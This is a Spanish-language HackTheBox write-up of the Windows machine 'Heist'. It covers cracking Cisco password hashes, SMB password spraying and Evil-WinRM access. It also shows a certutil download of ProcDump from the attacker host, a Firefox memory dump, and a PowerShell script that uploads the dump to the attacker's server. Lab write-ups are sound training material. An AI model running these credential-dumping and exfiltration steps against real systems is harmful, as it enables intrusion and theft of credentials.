---
icon: windows
tags:
  - smb
  - iis
  - winrm
  - cracking
  - cisco
  - sysinternals
---

# Heist

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Heist         |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 02/11/2026    |
| **IP Objetivo**       | 10.129.96.157 |

### Executive Summary

La máquina Heist presentaba un servidor web IIS con un portal de soporte. Mediante la enumeración web, se descubrió un inicio de sesión como invitado que permitía acceder a un ticket de soporte con un archivo adjunto de configuración de Cisco. El análisis de este archivo reveló hashes de contraseñas de los cuales se obtuvieron credenciales válidas. A través de un ataque de fuerza bruta de contraseñas (Password Spraying) contra SMB, se obtuvo acceso al servicio WinRM con el usuario `chase`. Finalmente, la enumeración local y el análisis de archivos del sistema revelaron que el navegador Firefox estaba en ejecución. Se realizó un volcado de memoria del proceso de Firefox, lo que permitió extraer las credenciales del usuario `Administrator` en texto plano, logrando así el compromiso total del sistema

### Técnicas

* Cisco Password Cracker
* SMB Enumeration
* Abusing WinRM
* Dumping Firefox Process

## Information Gathering

### Port Scanning

#### TCP

```bash
> nmap -p- -Pn -n -vv --min-rate 5000 10.129.96.157 -oG allPorts
> nmap -sCV -p80,135,445,5985,49669 -Pn -v 10.129.96.157 -oG allServices
```

| Puerto    | Servicio      | Versión                                  |
| --------- | ------------- | ---------------------------------------- |
| 80/tcp    | http          | Microsoft IIS httpd 10.0                 |
| 135/tcp   | msrpc         | Microsoft Windows RPC                    |
| 445/tcp   | microsoft-ds? |                                          |
| 5985/tcp  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP) |
| 49669/tcp | msrpc         | Microsoft Windows RPC                    |

### Enumeration

#### Web

El servidor web inicialmente presenta un login. Al no tener credenciales, se procede a iniciar sesión como Guest.

Al iniciar sesión como Guest, el usuario es redirigido a `/issues.php`.&#x20;

<figure><img src="../../../.gitbook/assets/unknown (9).png" alt="" width="375"><figcaption></figcaption></figure>

El usuario `Hazard` envía un mensaje en el canal de problemas notificando de que esta experimentando problemas con Cisco. En este mismo mensaje, adjunta un archivo accesible pulsando `Attachment`. Este archivo es `/attachments/config.txt`. Y su contenido es el siguiente:  En el archivo de configuración de CISCO, se presentan varios credenciales encriptados.

<figure><img src="../../../.gitbook/assets/unknown (1).png" alt="" width="375"><figcaption></figcaption></figure>

* Secret: `$1$pdQG$o8nrSzsGXeaduXrjlvKc91` (Tipo de hash: 5 = **MD5**)
* "Rout3r" password: `0242114B0E143F015F5D1E161713` (Tipo de hash: 7 = **Cisco**)
* "Admin" password: `02375012182C1A1D751618034F36415408` (Tipo de hash 7 = **Cisco**)

<figure><img src="../../../.gitbook/assets/unknown (2).png" alt=""><figcaption></figcaption></figure>

El primer hash (`secret`), fué identificado mediante hashes.com. Los dos otros se identificaron buscando cual es el "hash type 7", ya que no pudo ser identificado de otra manera.

#### SMB

* Al desencriptar el primer hash (`secret`), se hizo una hipotesis: Ya que el usuario que había reportado el problema era llamado `Hazard`, se procede a intentar autenticarse frente a SMB con ese nombre de usuario el credencial desencriptado obtenido. PD: Se probó la autenticación frente a WinRM pero el usuario no tenía capacidad de conexión remota.

```bash
> nxc smb 10.129.96.157 -u 'hazard' -p 'stealth1agent'
```

&#x20;Los credenciales son válidos para SMB.

* Con `netexec`, se intentó enumerar usuarios con el parametro `--users`, al no obtener respuesta, se procedió a enumerar con el parametro `--rid-brute`.

```bash
> nxc smb 10.129.96.157 -u 'hazard' -p 'stealth1agent' --rid-brute
```

Los usuarios enumerados fueron los siguientes:

```r
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

## Explotación

### Foothold

* **Vulnerabilidad:** Information Leakage + Password Crack
* **Exploit:** Cisco Type 7 Decoder, Hashes.com, NetExec (SMB) y Evil-WinRM.
* **Procedimiento:**

1.  Se desencripta el `secret` obtenido en el attachment `config.txt` (hashes.com)&#x20;

    <figure><img src="../../../.gitbook/assets/unknown (3).png" alt="" width="375"><figcaption></figcaption></figure>

Se obtiene el valor encodeado en HEX. Al decodificarlo, la contraseña en texto plano es: `stealth1agent`.



2. Se desencriptan los credenciales de `admin` y `rout3r` (password7decrypt.com)

Una vez obtenidas las contraseñas en texto plano, se realizó una prueba de autenticación frente al servicio SMB con todos los usuarios enumerados anteriormente con `--rid-brute`.

<figure><img src="../../../.gitbook/assets/unknown (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/unknown (5).png" alt=""><figcaption></figcaption></figure>

```bash
> nxc smb 10.129.96.157 -u 'chase' -p 'Q4)sJu\Y8qz*A3?d'
```

El usuario `chase`, fue el único usuario para el que se encontró un credencial válido.



3. Autenticación frente a `WinRM` con `Evil-WinRM`

```bash
> evil-winrm -i 10.129.96.157 -u 'chase' -p 'Q4)sJu\Y8qz*A3?d' 
```

Se logró realizar la conexión con el usuario `chase`, a diferencia de `hazard`, este usuario si tiene capacidad de conexión remota.



* **Evidencia:** (`user.txt`)



<figure><img src="../../../.gitbook/assets/unknown (10).png" alt=""><figcaption></figcaption></figure>

### Privesc

En el directorio Desktop, a parte de la flag, hay un archivo `todo.txt` El contenido del archivo es el siguiente:

```
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Adicionalmente, se ejecutó `WinPEAS` en la máquina víctima. Entre los resultados, destacó una alerta sobre credenciales guardadas en el navegador **Firefox**.

* **Vulnerabilidad:** Exposición de credenciales en memoria (Memory Dump / Cleartext Credentials)
* **Exploit:** Sysinternals ProcDump, análisis de strings
* **Procedimiento:**

1. Se verificó que existían múltiples procesos de Firefox en ejecución bajo el usuario `chase`. Dado que los navegadores modernos guardan las sesiones y contraseñas en la memoria RAM, se optó por volcar el proceso para extraer información sensible

```powershell
> Get-Process -Name firefox
```

<figure><img src="../../../.gitbook/assets/unknown (7).png" alt="" width="342"><figcaption></figcaption></figure>



2. Como la máquina víctima no contaba con herramientas de volcado, se descargó `ProcDump` desde nuestra máquina atacante y se ejecutó contra el proceso principal de Firefox (PID 5564).

```powershell
# En la máquina víctima
> certutil -urlcache -f http://10.10.14.108:9090/procdump.exe procdump.exe
> .\procdump.exe -ma 5564 -accepteula
```



3. Se utilizó un script en PowerShell para cargar el archivo `.dmp` a nuestra máquina atacante. Posteriormente, se utilizó la herramienta `strings` para buscar URLs y posibles credenciales en el volcado.

```powershell
> Add-Type -AssemblyName System.Net.Http

$uri = "http://10.10.14.108:8000/upload"
$filePath = "C:\Users\Chase\Desktop\firefox.exe_261102_192016.dmp"

$form = [System.Net.Http.MultipartFormDataContent]::new()
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("text/plain")

$form.Add($fileContent, "files", "firefox.exe_261102_192016.dmp")

$client = [System.Net.Http.HttpClient]::new()
$response = $client.PostAsync($uri, $form).Result
$response.EnsureSuccessStatusCode()
$response.Content.ReadAsStringAsync().Result
```

```bash
# En la máquina atacante
> strings firefox.exe_261102_192016.dmp > strings_firefox.txt
> cat strings_firefox.txt | grep localhost
```

```
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

En las primeras lineas se exponen peticiones que exponen los credenciales en texto plano del usuario admin en el servidor web `admin@support.htb:4dD!5}x/re8]FBuZ`



4. Se probaron las credenciales obtenidas (`admin@support.htb` / `4dD!5}x/re8]FBuZ`) contra el servicio WinRM. La contraseña era válida para el usuario `Administrator`.

```bash
evil-winrm -i 10.129.96.157 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
```

* **Evidencia:** (root.txt)

<figure><img src="../../../.gitbook/assets/unknown (8).png" alt=""><figcaption></figcaption></figure>
